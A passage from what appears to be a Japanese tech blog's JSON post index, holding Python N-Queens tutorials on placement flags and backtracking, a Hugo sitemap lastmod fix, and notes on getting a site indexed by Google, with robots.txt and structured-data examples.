Retirementとメールが来たときの対応"},{"content":"バックトラック 今回はバックトラックを説明していきたいと思います。 今回のバックトラックのロジックは前回の配置フラグの拡張版です。\n配置フラグは上下の利き筋までしかチェックしていませんでしたが今回のバックトラックは左右斜めの対角線上の利き筋もチェックします。\n上下の配置フラグの他に右斜め、左斜めの配置フラグを作ってチェックします。\nブルートフォース、配置フラグでは解の候補を出すに止まりましたが、今回で左右、上下、対角線上とクイーンのすべての利き筋をチェックすることができるますので、プログラム独力で解を出せるようになります。\n出力は解の数となっております。\nブルートフォース、配置フラグ、バックトラックの関係は以下の通りです。\n制約が1個、2個、3個と追加されていくような感じです。\n・ブルートフォース\n制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる\n・配置フラグ\n制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる\n制約2個目 配置フラグで同じ列にクイーンを置けないようにする 上下の利き筋をみる\n・バックトラック\n制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる\n制約2個目 配置フラグで同じ列にクイーンを置けないようにする 上下の利き筋をみる\n制約3個目 配置フラグを拡張し左右斜めにクイーンを置けないようにする 対角線上の利き筋をみる\nプログラムソースは以下のURLにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py\nグローバル変数 432,433行目でTOTAL,UNIQUEというグローバル変数が追加されています。\nブルートフォース、配置フラグは解の候補を列挙するにとどまっていましたが、今回からはプログラム内で正解数を出力するようになります。\nTOTALは正解数の総数です。\nUNIQUEですが、NQueenの解は左右ミラー反転、90度、180度、270度と左右反転していくと同じ形のものが結構あります。左右反転して同じ形のものを同一解としてカウントした数がUNIQUEとなります。\n436,437行目にFB,FC配列が追加されています。\nFBが左斜め、FCが右斜めの対角線の利き筋を配置フラグでチェックします。\n対角線上の配置フラグ 対角線の利き筋ですが１次元配列でチェックすることができます。\n図で見てみましょう。\n上下の利き筋について簡単です。\n例えば、1行目の右から2列目にクイーンを置いた場合は2、3、4行目の2列目にクイーンを置けなくなります。\n図 2、3、4行目の右から2列目にクイーンを置いた場合はその他の行の2列目にクイーンを置けなくなります。\n図 図 図 ですのでフラグはクイーンを置いた列番号に立てれば良いことになります。\n2列目だったらFA[1]=1です。\n対角線の利き筋についても計算が必要ではあるのですが法則性があり1次元配列で表現することが可能です。\nFB 左斜め対角線の利き筋について見てみましょう\n左斜め対角線のフラグの位置の計算法則は\n行数-クイーンを置いた列数+(サイズ-1)\nrow-i+(size-1)\nで1次元配列で表現できます。\n図で見てみましょう。\n1行目の1列目にクイーンを置いた場合\n左斜め対角線の利き筋は以下の通りになります。\n1行目1列目 [0,0] 2行目2列目 [1,1] 3行目3列目 [2,2] 4行目4列目 [3,3] 図 row-i+(size-1) で計算してみましょう\n1行目1列目 [0,0] 0-0+(4-1)=3 2行目2列目 [1,1] 1-1+(4-1)=3 3行目3列目 [2,2] 2-2+(4-1)=3 4行目4列目 [3,3] 3-3+(4-1)=3 FB[4] にフラグをたてれば左対角線の利き筋をチェックすることができます。\n2行目3列目にクイーンを置いた場合はどうなるでしょう\n左斜め対角線の利き筋は以下の通りになります。\n1行目2列目 [0,1] 2行目3列目 [1,2] 3行目4列目 [2,3] 図 row-i+(size-1) で計算してみましょう\n1行目2列目 [0,1] 0-1+(4-1)=2 2行目3列目 [1,2] 1-2+(4-1)=2 3行目4列目 [2,3] 2-3+(4-1)=2 FB[3] にフラグをたてれば左対角線の利き筋をチェックすることができます。\nFC 右斜め対角線の利き筋について見てみましょう\n右斜め対角線のフラグの位置の計算法則は\n行数+クイーンを置いた列数\nrow+i\nで1次元配列で表現できます。\n図で見てみましょう。\n1行目の4列目にクイーンを置いた場合\n右斜め対角線の利き筋は以下の通りになります。\n1行目1列目 [0,3] 2行目2列目 [1,2] 3行目3列目 [2,1] 4行目4列目 [3,0] 図 row+iで計算してみましょう\n1行目1列目 [0,3] 0+3=3 2行目2列目 [1,2] 1+2=3 3行目3列目 [2,1] 2+1=3 4行目4列目 [3,0] 3+0=3 FC[4] にフラグをたてれば右対角線の利き筋をチェックすることができます。\n2行目の2列目にクイーンを置いた場合\n右斜め対角線の利き筋は以下の通りになります。\n1行目1列目 [0,2] 2行目2列目 [1,1] 3行目3列目 [2,0] 図 row+iで計算してみましょう\n1行目1列目 [0,2] 0+2=2 2行目2列目 [1,1] 1+1=2 3行目3列目 [2,0] 2+0=2 FC[3] にフラグをたてれば右対角線の利き筋をチェックすることができます。\n長くなりましたので今回はグローバル変数の説明だけで終わります。\n次回は、新しく追加されたmainメソッドからプログラムの概要を説明したいと思います。\n","date":"2022-02-07T16:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/","title":"第5回 pythonでNQueen（エイトクイーン）バックトラック（１）"},{"content":"Hugoを使って記事を作成しているのですが、サイトマップをみてみるとlastmodの値がすべて同じになってました。その原因と解決策を今回は探っていこうと思います。\nHugoの導入や記事の投稿についての情報はHugoで記事の投稿の仕方やデザイナーでもできる初めてのHUGO #01を確認してください。\nGitから更新情報を取得するようにしている Hugoは非常に強力な機能をたくさん持っています。その一つがGitにある情報にアクセスできるという点です。\nこの機能を使えば、Gitに登録した人を投稿者としたり、push した日付を更新日とすることができます。\nつまり、自分で投稿者や更新日を記述する必要がないということになります。\nこのブログでもHugoとGitの連携を行っております。その連携自体は簡単です。\n設定ファイルに\nenableGitInfo: true と記述するだけで、Gitの情報にアクセスできます。\nfrontmatterの記述 Hugoには日付を制御できる設定があります。Hugoがコンテンツ・ページに日付を割り当てる方法を設定することができます。これは、config に frontmatter セクションを追加することで行うことが可能です。\n私の環境では下記のようになっておりました。\nfrontmatter: lastmod: - :fileModTime - :git - lastmod :fileModTimeはコンテンツファイルの最終更新タイムスタンプから日付を取得します。\n:gitではコンテンツファイルの最終リビジョンのGit作成日となります。\nこの設定を使うには、--enableGitInfo が設定されているか、サイト構成で enableGitInfo = true が設定されている必要があります。つまり、先程の設定ファイルに記述した設定となります。\nそして、lastmodです。\nこの設定は上から順に評価されていきます。\n詳細はHugoのfrontmatterを確認してください。\nGit Actioinsで設定したXMLの更新日がすべて同じになった 今回はXMLの作成の際にGitのデータを使用するようにしていました。\nローカルで確認したところ、hugo serverでの動作も、hugoにて書き出したファイルも更新日であるlastmodが正常に表示されていたので問題ないと判断して、Gitにアップしました。\nしかし、Gitではローカルと動作が異なっており、すべて同じ日付となってしまいました。\n一体なぜでしょうか？\nランキングや最新記事の反映で日付が更新された可能性 このサイトでは最新記事やランキングを掲載しております。それらは時間や投稿のタイミングで変化します。そういた変化を検知してしまって日付が変わってしまった可能性が考えられます。\nしかし、そうだとしたら、ローカルでも同様の問題になるかと思うので、この可能性は低そうです。\nGitHub Pagesで別ブランチで管理している このサイトはGitHub Pagesを使って別ブランチで管理しています。つまり、公開ディレクトリにあたる public 部分は前の考察のランキングや最新記事によって全てのページが変更されています。\nそして、別ブランチにアップする。つまり、すべてが書き換わるといったことが起こったのではないでしょうか。\n解決策 解決策はすごくと簡単です。\nGit と連携して lastmod の日付を自動で設定するために、enableGitInfo: true としていました。そして、この設定と同時に、下記のような設定もHugoの設定ファイル（yaml形式）に記述していました。\nfrontmatter: lastmod: - :fileModTime - :git - lastmod ここの frontmatter の記述をすべてコメントアウトにします。\nそれか、優先度のファイルのタイムスタンプから:gitに変更します。\nfrontmatter: lastmod: - :git - :fileModTime - lastmod これでlastmodが正しく表示されるようになりました。\nまとめ lastmod はSEOとしてあまり必要とされていないといった声も聞かれますが、正しく表示しておくことでサイトとしての信頼性は格段に上がると思います。\nHugoとGitの連携を行った際に、更新日など正しく反映されない箇所があった場合は設定などを見直してみましょう。\n簡単なことで問題が解決するかもしれません。\nおすすめの書籍 GitHub実践入門 ~Pull Requestによる開発の変革 (WEB\u0026#43;DB PRESS plus) GitHubの実践的な使い方を、実際に手を動かす形で解説する書籍です。初学者の方にもわかりやすいよう、基本的なGitやGitHubの使い方から、「ソーシャルコーディング」の目玉機能であるPull Requestの送り方・受け方まで解説します。また、外部ツールとの連携、GitHub FlowやGit Flowなど、GitHubを中心とした開発手法についてもしっかり解説しているので、中・上級者の方にも参考になるはずです。 目次 第1章:GitHubの世界へようこそ 第2章:Gitの導入 第3章:GitHubを利用するための準備 第4章:Gitを操作しながら学ぶ 第5章:GitHubの機能を徹底解説 第6章:はじめてのPull Request 第7章:Pull Requestが送られてきたら 第8章:GitHubと連携するツールとサービス 第9章:GitHubを利用した開発フロー 第10章:会社でGitHubを使おう Appendix A:GitHubをサポートするGUIクライアント Appendix B:Gistで手軽にコードを共有 続きを読む 。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 マンガと実践で学ぶGitの入門書が最新情報に対応して改訂しました! Gitの概念はもちろん、GitHubについても丁寧に解説しています。これからGitを使い始める人にオススメの1冊です。 本書ではクリック操作でGitを使えるSourceTreeを中心に解説しているので、初心者でも安心です。 はじめにより抜粋 ■せっかく学ぶなら、やっぱり楽しい方がいい 「Gitって難しそう」 「勉強しようとは思っているけど、なかなか一歩が踏み出せない」 そんな方のために、楽しくGitを理解できる本を作りました。 ・個性的なキャラクターたちが登場するマンガ ・感覚的にわかる図解 ・丁寧な実践パート 上記3つの特長で、Gitを無理なく学べます。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-07T11:28:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/catch_hud5f0ce966674d6b97fd2cc6aa77b573d_63288_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/","title":"SEO対策にXMLの更新日（lastmod）を正しく表示する方法"},{"content":"近年、ブログやWEBサイトを作って公開している人が増えてきました。\nそうした中で、Googleにインデックスされるというのは非常に重大なことです。せっかく書いた記事もGoogleにインデックスされないと検索結果に表示されません。\nGoogleにインデックスされないとき、どうしたら良いのでしょうか？\nブログを公開 まずはブログを公開する際に、GoogleアナリティクスやSearch Consoleの設定などを行いましょう。\nこれによって、どんな人が来ているのかなどを閲覧することができたり、実際にサーバを閲覧することなくGoogleクローラーの状況やインデックスの状況、SEO対策などの機能などが盛りだくさんです。\nそして、Googleだけでなく Bingの方も登録しておくことをオススメします。Bingのクローラーはかなり早く、以前のGoogleのようにインデックスをしてくれます。\nサイトマップをつくる サイトマップと呼ばれるXMLを作成しましょう。\n小規模なサイトやページ同士がしっかりリンクしているサイトであれば不要かもしれませんが、サイトマップは作っているに限ります。\nクローラーはそのサイトマップを見て、サイトの構造を把握していきます。\nもちろん、ページ構成がしっかりしたサイトであればクローラーは内部リンクのみでサイトマップを構築することが可能です。\nクローラーの手助けとなるために、内部リンクをしっかり作り、サイトマップも作っておけばクローラビリティが格段にアップするでしょう。\nサイト公開から半月 サイトを公開してから半月、クローラーが１回来て、サイトマップをのデータからクローラーを開始したようです。\nGoogleで検索しても表示されるようになりました。\nサイト公開から１ヶ月 クローラーはほぼ仕事をしなくなりました。\n来ていないということはなく、来ても数ページクロールして去っていきます。\n新しいページをクロールすることはありませんでした。\n以前の作成したサイトと比較してもクローラーの活動頻度が激減していることは確かです。\n数年前に作成して更新していないサイトのサイトマップのクロール頻度は１週間程度でした。新しく作成したサイトでは1ヶ月過ぎてもサイトマップへのクローラーがきませでした。\n対応策を試す robots.txtを編集する クロールの結果を見ると画像やcss、jsなどにアクセスしていたため、htmlへのクロールを促すために、これらをrobots.txtにて許可しない設定にしてみました。\n理由としては、すべてクロールするようにしてますが、cssやjsなどのファイルもクロールされており、そこにリソースが使われてHTMLまでクロールされていないのではないかと考えたためです。\nUser-agent: Googlebot-Image Allow: /*.jpg$ Allow: /*.png$ Allow: /*.gif$ User-agent: * Disallow: /*.jpg$ Disallow: /*.png$ Disallow: /*.gif$ Disallow: /assets/ Disallow: /404.html Disallow: /js/ Disallow: /ts/ Disallow: /images/ Disallow: /scss/ Disallow: /css/ Allow: / 後でわかったのですが、これは完全にNGです。\nGoogleの記事を呼んでいると、従来のテキストベースから実際のブラウザのように動作し、レンダリング速度なども考慮しているとのことでした。結果、現在は404のページ以外はフルオープンにしております。\nUser-agent: * Disallow: /404.html Allow: / 構造体データを追加 SEO効果があるということで、構造体データを追加してみました。構造化データの仕組みについてはこちらを確認してください。\n効果があるかはまだわかりませんが、Search Consoleを見てみると、数ページは認識しているようです。\nSEO効果があるかと言われると、重要ではないといった話もあるので余力のある方は実装といったことになるかと思います。\n\u0026lt;script type=\u0026#34;application/ld+json\u0026#34;\u0026gt; [{ \u0026#34;@context\u0026#34;: \u0026#34;https://schema.org\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;BlogPosting\u0026#34;, \u0026#34;headline\u0026#34;:\u0026#34;Googleにインデックスされないときの対応方法は？\u0026#34;, \u0026#34;mainEntityOfPage\u0026#34;:{ \u0026#34;@type\u0026#34;: \u0026#34;WebPage\u0026#34;, \u0026#34;@id\u0026#34;:\u0026#34;[$URL]\u0026#34; }, \u0026#34;datePublished\u0026#34;:\u0026#34;\u0026#34;, \u0026#34;dateModified\u0026#34;:\u0026#34;\u0026#34;, \u0026#34;publisher\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;Organization\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;NLP - 最新技術やプログラム、デザインなど様々な情報を提供するサイト\u0026#34;, \u0026#34;logo\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;ImageObject\u0026#34;, \u0026#34;url\u0026#34;:\u0026#34;[$URL]/images/logo.png\u0026#34;} }, \u0026#34;author\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;Person\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;nlp\u0026#34;, \u0026#34;url\u0026#34;:[\u0026#34;[$URL]/authors/wyoshi/\u0026#34;] } },{ \u0026#34;@context\u0026#34;: \u0026#34;https://schema.org\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;BreadcrumbList\u0026#34;, \u0026#34;itemListElement\u0026#34;: [{ \u0026#34;@type\u0026#34;: \u0026#34;ListItem\u0026#34;, \u0026#34;position\u0026#34;: 1, \u0026#34;name\u0026#34;:\u0026#34;NLP - 最新技術やプログラム、デザインなど様々な情報を提供するサイト\u0026#34;, \u0026#34;item\u0026#34;:\u0026#34;[$URL]\u0026#34; }] }] \u0026lt;/script\u0026gt; サイトマップを消す サイトマップ自体へのアクセスが頻繁に行われていないので、サイトマップを消してみました。\nクロールされないかと思いましたが、Bingで新しい記事をクロールして取得されてました。\nしかし、記事のタイトルを変えてもなかなか変わらないのでやはりサイトマップは必要かもしれません。\nタイトルを変える タイトルを変えて、ページに更新をかけてみましたが、クロールされませんでした。\nBingも同様にタイトルを変えただけではクロールされないようでした。\nサイトマップのHTMLを作成する クローラーがクロールしやすいようにサイトマップのHTMLを作成しました。\nこれによって、クローラーが内部リンクを通じて各ページにアクセスできるかなと思いますが、まだ効果の程はわかりません。\nランキングを作成する ランキングページの作成も上記の「サイトマップのHTMLを作成する」のようにクローラビリティを上げるためになります。\nあとは、自分たちでもどんな記事を読まれているのかといった指標をすぐ閲覧できるからです。\nSEO対策 画像のサイズの最適化 画像のサイズが最適化できていなかったので、画像のサイズの最適化を行いました。\nこれによってSEOのスコアを上げることができました。サイトの速度もインデックスされるためには重要な指標になってくるので、きれいな画像を使用したいときは各デバイスに最適化された画像を用意して、サイトの速度を落とさないようにしましょう。\nasideのdiv化 ページに直接関係ない部分をasideタグで書いていたのですが、内部リンクをたどってないのではないかと考えて、asideをdivに変更しました。\nこれによって、効果があるかはわかりませんが……。\n内部リンクを増やす カテゴリーだけでなく、著者のページなどを作成して内部リンクするようにしました。\nこれは若干の効果があって、サイトマップ\nh1タグの正規化 以前はロゴに当たる部分が h1 となっていたので、各ページでタイトルになる部分に h1 が当たるように変更しました。\nロゴに h1 を当てる人が多いかと思いますが、各ページのタイトル部分に当てたほうが、ページのタイトルとh1との整合性が取れます。\nまた、h1は1ページに1つとされていますが、あくまで原則で、何個出てきても大丈夫です。ただし、たくさん使うのはNGになるので注意してください。\nパンくずを追加 孤立ページを出さないように、そして、ページごとの回遊率を上げるためにパンくずを設置しました。\nパンくずはクローラーにとっても内部リンクをたどっていけるようになるのではないかと考えております。\nURL検査を行う クローラーが活動をしていないので、サイトマップへ自動的にアクセスして追加してくれるという望みを諦めて、「URL検査」を使って、手動でクローラーを呼び寄せます。\nこれによって、以前は除外が22件あったものが2月1日では4件まで減りました。\nそして、新しく作成したページも2件ほどGoogle検索に出るようになり、すでにインデックスされていたページは変更が検知され、タイトルの表記が変わりました。\nURL検査は非常に効果的です。\nしかし、記事ページへのアクセスはまだないので、これは再度原因を探る必要があります。\n変更されたのは以前サイトマップに登録されていたページなので、クローラーがサイトマップでインデックスしたものを優先している可能性がありそうです。\nまとめ Googleにインデックスされない問題はかなり多いようです。\nBingでの流入やSNSでの流入はもちろん大事ですが、Googleで検索している人が多い以上対応する必要があります。\nまずは記事の品質を上げて、SEO対策し、そして「URL検査」を行う。そうして、Googleクローラーが来てインデックスされるのを待つほかいまのところありません。\nまた何か動きがあれば掲載してきたいと思います。\nおすすめの書籍 沈黙のWebマーケティング ─Webマーケッター ボーンの逆襲─ アップデート・エディション この商品は固定レイアウトで作成されており、タブレットなど大きいディスプレイを備えた端末で読むことに適しています。また、文字列のハイライトや検索、辞書の参照、引用などの機能が使用できません。 〈電子書籍版に関する注意事項〉 本書は固定レイアウト型の電子書籍です。リフロー型と異なりビューア機能が制限されるほか、端末によって見え方が異なりますので、ご購入前にお使いの端末にて「無料サンプル」をお試しください。 【Web集客で悩むすべての人へ！ 成果を上げる「極意」を伝える。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 いちばんやさしい新しいSEOの教本 第2版 人気講師が教える検索に強いサイトの作り方[MFI対応] (「いちばんやさしい教本」シリーズ) SEO入門の定番書を最新環境に合わせてリニューアル! 「今まで何冊もSEOの本を読みましたが、正統派のSEOの思想が理解出来る一番良質な内容でした」 「セミナー形式で書かれているので、自社サイトに当てはめて作業することができました」 「こんなに洗いざらいノウハウを体系だてて載せていいのか! ?と心配するくらい満足のいく内容でした。」 「何か困った時にバイブル的に活用できる1冊です。」 (以上、前書のAmazonカスタマーレビューより抜粋) SEO(検索エンジン最適化)とは、 「検索結果の上位にサイトを表示すること」ではありません。 「訪問者の目的に応えるサイトを作ること」です。 そのために、対策すべきキーワードを選定し、 サイトの構造を整えることが大切なのです。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-04T12:03:03+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/catch_hu99b3f2f48bb0e7609bdb6185b70654fd_77735_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/","title":"Googleにインデックスされないときの対応方法は？"},{"content":"配置フラグ（制約テスト高速化） 今回も引き続き配置フラグ（制約テスト高速化）を説明していきたいと思います。 前回はプログラムの概要を説明しましたが、今回はnqueenメソッドの再帰と配置フラグの動きについて図で示しながら説明していきたいとおもいます。\nプログラムソースは以下のURLにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py02_nqueen.py\nプログラムはエイトクイーン(N=8)ですが説明をしやすくするため4x4のN=4で説明します。実際に動かしてプログラムの動作を確認したい方は419,420行目のMAXとSIZEを4に変更してみてください。\nおさらい ブルートフォースからのおさらいとして次の点を押さえておきましょう。\n・442行目のABOARD[row]=i はクイーンを配置する動きです。\n・445行目のnqueen(row+1)は再帰でnqueenメソッドを動かしていますがこれは次の行に進む動きです。\n・438,439は最終行(4行目)までクイーンを置ききった後にCOUNT と各行にクイーンを置いた場所を出力します。\n再帰でnqueenメソッドを呼び出したときは、当然のことなのですがメソッドの先頭435行目に移動します。\n引数で渡されたrow以外のローカル変数はすべて初期化された状態になります。\n・再帰から抜ける部分は2箇所あります。\n一つ目は、438,439行目で最終行(4行目)までクイーンを置ききった後にprintoutする時\n二つ目は、441行目のfor文がSIZE数の数(N=4だと3)だけ回りきったあとです。\n再帰から抜けたときは再帰を呼び出した445行目のすぐ後ろからスタートします。\nローカル変数の状態は再帰を呼び出す直前の状態になります。\n1行前に戻るような動きとなります。\nちなみに441行目のfor i in range(SIZE)は右端から左端に1個ずつクイーンを置こうとする動きです。\n左端までクイーンを置ききったらfor文を抜けるイメージです。\nnqueen メソッドの動き 448行目のnqueen(0)からスタートします。\nメソッドの先頭435行目に移動します。\nrow=0なので440行目の else: に移動します。\n441行目のfor文に入りi=0からスタートします。\n442行目のABOARD[0]=0で1行目の右端にクイーンを設置します。\n図 1個目のクイーンなので当然配置フラグはどれもOの状態ですから443行目のif FA[0] == 0 の条件を満たしてif文の中に入ります。\n右端にクイーンを置いたのですから444行目でFA[0]=1 で右端の位置にフラグをたてます。\n445行目でnqueenを引数1を渡して呼び出して2行目に進みます。\n再帰呼び出しなのでrow=1の状態でメソッドの先頭435行目に移動します。\nrow=1なので440行目の else: に移動します。\n441行目のfor文に入りi=0からスタートします。\n442行目のABOARD[1]=0で2行目の右端にクイーンを設置します。\n図 1行目で既に右端にクイーンを設置していますのでFA[0]は1になりますので443行目のif FA[i]==0の条件を満たしません。\nif文に入らずに次のfor文に進みます。\nこの部分が今回追加された配置フラグの制御になります。\nこの処理のおかげで上下の利き筋に引っかかる場合は次の行に移動するのをやめ探索を効率化することができます。\n441行目で次のfor文に進みi=1となります。\n442行目のABOARD[1]=1で2行目の右から2列目にクイーンを設置します。\n図 1行目で右端にクイーンを置いているのでFAの状態は以下のとおりです。\nFA[0]==1 FA[1]==0 FA[2]==0 FA[3]==0 FA[1]は0なのでif FA[i]==0の条件を満たすのでif 文の中に入ります。\n右端から2列目にクイーンを置いたのですから444行目でFA[1]=1 で右端から2番目の位置にフラグをたてます。\n445行目でnqueenを引数2を渡して呼び出して3行目に進みます。\n再帰呼び出しなのでrow=2の状態でメソッドの先頭435行目に移動します。\nrow=2なので440行目の else: に移動します。\n441行目のfor文に入りi=0からスタートします。\n442行目のABOARD[2]=0で3行目の右端にクイーンを設置します。\n図 1行目で右端に、2行目で右から2列目にクイーンを置いているのでFAの状態は以下のとおりです。\nFA[0]==1 FA[1]==1 FA[2]==0 FA[3]==0 i=0 FA[0]=1なのでif FA[i]==0の条件を満たさずに次のfor文に進みます。\n441行目で次のfor文に進みi=1となります。\n442行目のABOARD[2]=1で3行目の右から2列目にクイーンを設置します。\n図 1行目で右端に、2行目で右から2列目にクイーンを置いているのでFAの状態は以下のとおりです。\nFA[0]==1 FA[1]==1 FA[2]==0 FA[3]==0 i=1 FA[1]=1なのでif FA[i]==0の条件を満たさずに次のfor文に進みます。\n441行目で次のfor文に進みi=2となります。\n442行目のABOARD[2]=2で3行目の右から3列目にクイーンを設置します。\n図 FA[0]==1 FA[1]==1 FA[2]==0 FA[3]==0 i=2 FA[2]=0なのでif FA[i]==0の条件を満たすのでif文の中に入ります。\n右端から3列目にクイーンを置いたのですから444行目でFA[2]=1 で右から3列目の位置にフラグをたてます。\n445行目でnqueenを引数3を渡して呼び出して4行目に進みます。\n再帰呼び出しなのでrow=3の状態でメソッドの先頭435行目に移動します。\nrow=3なので440行目の else: に移動します。\n441行目のfor文に入りi=0からスタートします。\nfor文の中で右端から左端へ順番にクイーンを置いていくことになりますが。\nすでに、1行目で右端、2行目で右から2列目、3行目で右から3列目にクイーンを設置しています。\nFAの状態を見てみると以下の通りです。\nFA[0]==1 FA[1]==1 FA[2]==1 FA[3]==0 そのためiが0,1,2の時は443行目の配置フラグの制約に引っかかりif文の中には入らず次のfor文に進みます。\n図 図 図 i=3では\nABOARD[3]=3で4行目の左端にクイーンを設置します。\n図 やっとフラグの制約に引っかからず443行のif文の中にはいれます。\nFA[3]=1\n444行目でFA[3]=1 で右から4番目の位置にフラグをたてます。\n445行目でnqueenを引数4を渡して呼び出して先に進みます。\n再帰呼び出しなのでrow=4の状態でメソッドの先頭435行目に移動します。\nrow=4なので438行目の if row == SIZE:の条件を満たします。\n439でprintout()メソッドを呼び出してCOUNT と各行のクイーンの設置場所を出力します。\nそして、再帰を抜け4行目の処理（row=3）に戻ります。\n戻る場所は445行目のすぐ下です。\nローカル変数は再帰を呼び出す直前の状態にもどっています。\nrow=3 i=3です。\n446行目でFA[3]=0 でフラグを落としています。\nグローバル変数は再帰からもどっても再帰を呼び出す直前の状態に自動的にはもどらないので明示的にフラグを落とす必要があります。\n446行目でフラグを落としたあと次のfor文に進むのですが、すでにi=3なのでfor文を抜けます。\nfor文を抜けると再帰を抜け3行目の処理(row=2)に戻ります。\nここではrow=4,row=3と立て続けに再帰をぬけrow=2に戻る形となります。\n戻る場所は445行目のすぐ下です。\nローカル変数は再帰を呼び出す直前の状態にもどっています。\n3行目はforは0,1,2まで進んでいました。\nrow=2 i=2です。\n446行目でFA[2]=0 でフラグを落としています。\nそして次のfor文に進みます。\ni=3で\nABOARD[2]=3で3行目の左端にクイーンを設置します。\n図 FAの状態を見てみると以下の通りです。\nFA[0]==1 FA[1]==1 FA[2]==0 FA[3]==0 FA[3]=0なのでif FA[i]==0:の条件を満たしてif 文の中に入ります。\n右から4列目にクイーンを置いているので444行目でFA[3]=1 でフラグをたてます。\n445行目でnqueenを引数3を渡して呼び出して先に進みます。\n再帰呼び出しなのでrow=3の状態でメソッドの先頭435行目に移動します。\nrow=3なので440行目の else: に移動します。\n441行目のfor文に入りi=0からスタートします。\nfor文の中で右端から左端へ順番にクイーンを置いていくことになりますが。\nすでに、1行目で右端、2行目で右から2番目、3行目で右から4番目にクイーンを設置しています。\nFAの状態を見てみると以下の通りです。\nFA[0]==1 FA[1]==1 FA[2]==0 FA[3]==1 そのためiが0,1の時は443行目の配置フラグの制約に引っかかりif文の中には入らず次のfor文に進みます。\n図 図 i=2では\nABOARD[3]=2で4行目の右から3列目にクイーンを設置します。\n図 やっとフラグの制約に引っかからず443行のif文の中にはいれます。\nFA[2]=1\n444行目でFA[2]=1 で右から3列目の位置にフラグをたてます。\n445行目でnqueenを引数4を渡して呼び出して先に進みます。\n再帰呼び出しなのでrow=4の状態でメソッドの先頭435行目に移動します。\nrow=4なので438行目の if row == SIZE:の条件を満たします。\n439でprintout()メソッドを呼び出してCOUNT と各行のクイーンの設置場所を出力します。\n細く動作をみていくとこんな感じになります。\nブルートフォースの時は無条件に再帰的にnqueenメソッドを呼び出し次の行にいっていましたが制約フラグを使うことによって無駄に深い階層にもぐっていくことを大分防止できていることがわかると思います。\n","date":"2022-02-04T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/","title":"第4回 pythonでNQueen（エイトクイーン）配置フラグ（制約テスト高速化）（２）"},{"content":"配置フラグ（制約テスト高速化） 前回は全くアルゴリズムを使わないで全パターン１行に１つずつクイーンを設置するブルートフォース　力任せ探索でした。\nエイトクイーン(N=8)ですら凄く時間がかかることが体感できたかと思います。\n今回も解を出すまでには至りませんが、一つ進んで、配置フラグ（制約テスト高速化）を使いより効率よく解の候補を列挙する方法を説明したいと思います。\nエイトクイーン問題はクイーンの利き筋上下左右斜め８方向にクイーンを置けないという制約があるのですが、今回は「上下の制約」すなわち、同じ列にはクイーンを置けないという制約を配置フラグを使って追加してみます。\n例えば、\n1行目で右端にクイーンを置くと以降の行では右端にクイーンを置けなくなります。\n図 上の図だと2行目で1行目ですでにクイーンを置いている右端にクイーンを置こうとしているのでNGです。\n図 上の図は2行目は良いのですが3行目で1行目にすでにクイーンを置いている右端にクイーンを置こうとしているのでNGです。\n図 図 上の２つの図のように同じ列にクイーンを置かないパターンを探索します。\n配置フラグ（制約テスト高速化）を使って私の端末でエイトクイーン(N=8)を実行すると、0m0.554sかかります。ブルートフォースが3m7.321sかかったので360倍くらい速いですね。\nグローバル変数について それではプログラムについて説明していきましょう。\nプログラムソースは以下のURLにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py02_nqueen.py\nプログラムの作りとしては前回のブルートフォースをベースにしてそこに配置フラグを追加したものとなりますので、ブルートフォースとの差異を説明していきたいと思います。\nまず、グローバル変数について説明します。\n今回も動作をわかりやすくするため419,420行目のMAXとSIZEを4に変更してみてください。\n423行目 配列 FA がグローバル変数として新しく追加されています。\n0 for i in range(SIZE) で0に初期化しています。\nどの列にクイーンを置いたかをフラグで管理します。\nFA[0]が右端,FA[1]が右端から2番目,FA[2]が右端から3番目,FA[3]が右端から4番目(左端)になります。\n例えば2列目にクイーンを置くとFA[1]=1にしてフラグを立てます。\nnqueenメソッドについて nqueenメソッドの作りも基本的に前回のブルートフォースと同じです。\n443行目〜446行目に配置フラグFAの処理が追加されているところが違う部分となります。\n442行目 ABOARD[row]=i でクイーンを設置します。\n前回のブルートフォースの場合は\n無条件で次の行でnqueen(row+1)で再帰的にnqueenを呼び出していました。 今回の配置フラグでは\n443行目 if FA[i] == 0: の条件を満たした場合だけ再帰的にnqueenを呼び出しています。\niは今回クイーンを置いた場所を意味します。\n444行目でクイーンを置いた列の配置フラグをあらかじめ1にしておきます。\n例えば以下の図の様な場合\n図 1行目では右端にクイーンを置くので、\n444行目の処理でFA[0]=1となります。\n2行目は右端から2番目にクイーンを置くので、\nFA[1]=1となります。\n3行目は右端にクイーンを置いているのでiは0です。\n443行目の if FA[i]== 0 : 